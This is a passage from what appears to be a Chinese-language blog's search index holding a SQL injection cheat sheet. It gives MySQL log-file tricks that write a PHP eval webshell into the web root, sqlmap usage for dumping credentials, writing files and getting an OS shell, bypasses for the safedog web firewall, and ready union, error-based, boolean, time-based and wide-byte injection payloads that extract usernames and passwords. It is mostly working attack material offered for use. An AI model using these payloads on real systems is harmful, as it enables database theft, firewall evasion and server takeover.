class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line">原因:mysql会将执行的语句记录到全局日志，从而将shell写入网站目录</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="慢日志"><a href="#慢日志" class="headerlink" title="慢日志"></a>慢日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.开启参数</span><br><span class="line">secure_file_priv=    ---&gt;&gt;mysql.ini 配置文件</span><br><span class="line">2.查看慢查询日志是否开启</span><br><span class="line">show variables like&#x27;%long_query_log%&#x27;</span><br><span class="line">3.开启慢查询日志并修改日志文件的绝对路径</span><br><span class="line">set global slow_query_log=1;</span><br><span class="line">set global slow_query_log_file =&#x27;C:/phpstudy/WWW/shell1.php&#x27; ;</span><br><span class="line">查询mysql系统时间</span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">向日志写入shell(设置查询时间超过系统时间)</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注入工具-Sqlmap"><a href="#注入工具-Sqlmap" class="headerlink" title="注入工具:Sqlmap"></a>注入工具:Sqlmap</h2><h3 id="参数使用"><a href="#参数使用" class="headerlink" title="参数使用"></a>参数使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap使用的payload可以在xml/payloads.xml</span><br><span class="line">-u / --url  </span><br><span class="line">python sqlmap.py -u “http://www.target.com/index.php?id=1”</span><br><span class="line">-m 从文本获取多个目标,每行只能有一个url,文本要在sqlmap目录中</span><br><span class="line">python sqlmap.py -m test.txt</span><br><span class="line">-r 从文件中加载HTTP请求(post,cookie的注入时方便)</span><br><span class="line">python sqlmap.py -r test.txt</span><br><span class="line">-v 显示等级 默认为1</span><br><span class="line">0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认等级）</span><br><span class="line">2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。</span><br><span class="line">5、同时显示HTTP响应头。6、同时显示HTTP响应页面。</span><br><span class="line">--data  post方式提交,参数后面接注入点,--data=&quot;admin&#x27;&quot; </span><br><span class="line">python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&#x27;&quot;</span><br><span class="line">--cookie  抓包获取登录web的cookie参数</span><br><span class="line">--cookie=”Cookie: Hm_lvt6910067,1546929561,1547001094,1547024662; PHPSESSID=o64fbvo316lg59njufl2gfutm4; ”</span><br><span class="line"></span><br><span class="line">--user-agent  默认sqlmap的HTTP请求头中是sqlmap/1.0-dev-xxxxxxxxx(http://sqlmap.org)</span><br><span class="line">sqlmap.py  -u “http://www.target.com” --level 3 --user-agent=”aaaaaa” --dbs</span><br><span class="line"></span><br><span class="line">--random-agent 从/usr/share/sqlmap/data/txt/user-agents.txt中随机产生User-Agent头。</span><br><span class="line">默认level&gt;=3才会去检查user-agent头是否存在注入漏洞</span><br><span class="line">--referer  HTTP Referer头  当--level参数设定&gt;=3时，会尝试进行referer注入。</span><br><span class="line">sqlmap.py  -u “http://www.target.com/?id=1”  --referer=”http://www.baidu.com</span><br><span class="line">--delay 可以设定两个http请求间的延迟，设定为1的时候是1秒，默认是没有延迟的。</span><br><span class="line">--timeout可以设定一个http请求超过多少秒判定为超时，默认是30秒。</span><br><span class="line">-p 指定参数 sqlmap 默认会测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User- Agent和HTTP Referer头的值。</span><br><span class="line">-p “id,user-angent”</span><br><span class="line">--skip 跳过指定参数</span><br><span class="line">--skip=”user-agent,referer”</span><br><span class="line">--level </span><br><span class="line">默认为1</span><br><span class="line">level&gt;=2的时候就会测试HTTP Cookie。</span><br><span class="line">level&gt;=3的时候就会测试HTTP User-Agent/Referer头。</span><br><span class="line">level=5 的时候会测试HTTP Host</span><br><span class="line">--risk 设定探测风险等级</span><br><span class="line">默认是1会测试大部分的测试语句</span><br><span class="line">2会增加基于时间的测试语句</span><br><span class="line">3会增加OR语句的SQL注入测试。</span><br><span class="line">在有些时候，例如在UPDATE，DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险</span><br><span class="line">--technique  指定注入类型  (B--盲注  Q--内联  T--时间  U--联合 E--错误  S--栈查询)</span><br><span class="line">--dbs当前数据库  --users列出当前登录的用户名  --passwords 列出当前登录的用户密码  --is-dba判断是否root权限   --current-db当前数据库 --privileges 权限 </span><br><span class="line">-D database_name -T table_name -C column_1,column_2  --dump</span><br><span class="line">--proxy指定代理服务器 -proxy http://local:8080</span><br><span class="line">--prefix 注入payload字符串前缀</span><br><span class="line">--suffix 注入payload字符串后缀</span><br><span class="line">eg：sqlmap -u “www.target.com/index.php?id=1” -p id --prefix “&#x27;))))” </span><br><span class="line">--suffix “AND (&#x27;1&#x27;=&#x27;1”</span><br><span class="line">移动文件 ： </span><br><span class="line">sqlmap -u “www.a.com/1.php?id=1” --file-write=”d:/2.txt” </span><br><span class="line">--file-dest=”E:/wwwroot/bihuoedu/one.php“</span><br><span class="line">--batch 全自动</span><br><span class="line">--start=开始条数 --stop=结束条数</span><br><span class="line">--dump 导出当前数据库所有数据</span><br><span class="line">--dump-all 导出数据库所有数据</span><br><span class="line">--purge 清空缓存目录 </span><br><span class="line">--sql-shell  反弹sqlshell,类似于sql查询分析器默认路径.sqlmap （点sqlmap）</span><br><span class="line">参数--os-shell（分析一下）</span><br><span class="line">前提：需要网站的物理路径，其次是需要有FIILE权限。</span><br><span class="line">sqlmap -r “C:\sqlmap\request.txt” -p id  --dms mysql --os-shell </span><br><span class="line">接下来指定网站可写目录：</span><br><span class="line">“C:\www”</span><br><span class="line">d:\phpstudy\www   (成功）</span><br></pre></td></tr></table></figure><h3 id="–os-shell流量分析"><a href="#–os-shell流量分析" class="headerlink" title="–os-shell流量分析"></a>–os-shell流量分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap的--os-shell在mysql数据库中的原理，其实就是往服务器上写入了两个php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页url中通过对cmd参数传参执行系统命令。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Sqlmap写shell"><a href="#Sqlmap写shell" class="headerlink" title="Sqlmap写shell"></a>Sqlmap写shell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.若存在注入，我们首先找到他的密码，然后进入网站后台进入后台我们就可以找上传点，然后上马拿shell</span><br><span class="line">2.使用一些参数，比如sqlmap -u “xxxxx” --file-write=&quot;/root/Desktop/1.txt&quot; --file-dest=“f:\1.txt” sqlmap写文件，需要dba权限</span><br><span class="line">3.--os-shell</span><br></pre></td></tr></table></figure><h2 id="SQL注入-绕safedog"><a href="#SQL注入-绕safedog" class="headerlink" title="SQL注入-绕safedog"></a>SQL注入-绕safedog</h2><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>变量代替</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">or 1 = 1----&gt;&gt;|| true = true</span><br><span class="line">group by -----&gt;&gt; oeder by</span><br></pre></td></tr></table></figure><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1 = 1 ---&gt;&gt; and /*!000001*/=/*!000001*/</span><br></pre></td></tr></table></figure><h4 id="垃圾填充"><a href="#垃圾填充" class="headerlink" title="垃圾填充"></a>垃圾填充</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(/**/----空格)/*1*/---&gt;&gt;(bp爆破intrude-&gt;Brute forecer)/*$1$*/----&gt;&gt;(填充垃圾)./*!+*$&amp;</span><br></pre></td></tr></table></figure><h4 id="换行-0a"><a href="#换行-0a" class="headerlink" title="换行%0a"></a>换行%0a</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 /*!union--+/*%0Aselect 1,2,3 */--+</span><br></pre></td></tr></table></figure><h4 id="like-“-23-”阻断"><a href="#like-“-23-”阻断" class="headerlink" title="like “[%23]”阻断"></a>like “[%23]”阻断</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id =&#x27;1&#x27; like &quot;[%23]&quot; union select * from referers</span><br><span class="line">阻断前面的输出结果,相当于</span><br><span class="line">select * from users where id =&#x27;-1&#x27;  union select * from referers</span><br></pre></td></tr></table></figure><h2 id="SQL注入payload"><a href="#SQL注入payload" class="headerlink" title="SQL注入payload"></a><strong>SQL注入payload</strong></h2><h5 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一 . 联合注入"></a>一 . 联合注入</h5><p>列出所有数据库 : </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来库名</span><br><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 一次性全部显示</span><br><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>列出(数据库：test)中所有的表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来字段名</span><br><span class="line">select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 一次性全部显示</span><br><span class="line">select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x674657374</span><br><span class="line">注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</span><br></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">imit 一个一个打印出来</span><br><span class="line">select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;test&#x27; and TABLE_NAME=&#x27;t10&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 一次性全部显示</span><br><span class="line">select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 一个一个打印出来</span><br><span class="line">select username,password from security.users limit 0,1</span><br><span class="line"></span><br><span class="line">group_concat 把 一次性全部打印</span><br><span class="line">select group_concat(concat(username,0x20,password)) from security.users</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="二-报错注入"><a href="#二-报错注入" class="headerlink" title="二 . 报错注入"></a>二 . 报错注入</h5><p>请注意,如果需要全部显示数据库需要用到substr函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(字符串,1,截取长度)</span><br><span class="line">select substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,7);</span><br></pre></td></tr></table></figure><h6 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错 :"></a>floor报错 :</h6><p>获取总共多少数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat((select (select (select concat(0x7e,count(schema_name),0x7e) from information_schema.schemata)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><p>列出数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单个列出 :</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1)),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br></pre></td></tr></table></figure><p>查询表和字段直接把联合注入的payload放进去就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and(select 1 from (select count(*),concat(concat((payload),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br></pre></td></tr></table></figure><h6 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a>ExtractValue报错</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and extractvalue(1, (concat(0x7e,(payload),0x7e)))</span><br><span class="line"></span><br><span class="line">and extractvalue(1, concat(0x7e,(select @@version),0x7e))</span><br><span class="line">and extractvalue(1,(concat(0x7e,(select group_concat(concat(username,0x20,password)) from security.users),0x7e)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>and extractvalue(1, concat(0x7e,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),0x7e))</p><h6 id="UpdateXML报错"><a href="#UpdateXML报错" class="headerlink" title="UpdateXML报错"></a>UpdateXML报错</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and updatexml(1,(payload),1)</span><br><span class="line"></span><br><span class="line">and updatexml(1, (concat(0x7e,(select user()),0x7e)),1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三 .布尔注入 :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select ascii(substr((payload), 1, 1)))&gt;105 </span><br><span class="line">and (select ascii(substr((select password from security.users limit 1,1), 1, 1)) =73)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="四-时间注入"><a href="#四-时间注入" class="headerlink" title="四 . 时间注入 :"></a>四 . 时间注入 :</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((payload), 1, 1))=114, sleep(5), 1)</span><br><span class="line"></span><br><span class="line">if(ascii(substr((select password from security.users limit 1,1), 1, 1))=73, sleep(5), 1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="五-宽字节注入"><a href="#五-宽字节注入" class="headerlink" title="五 .宽字节注入"></a>五 .宽字节注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id&#x27;%df</span><br><span class="line">GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际为2字节</span><br><span class="line"></span><br><span class="line">如果使用了类似于set names gbk这样得语句,此时mysql数据库就会将</span><br><span class="line"></span><br><span class="line">Ascii大于128(%df)得字符当作是汉字字符得一部分,从而能吃掉\,引入单引号或者双引号</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
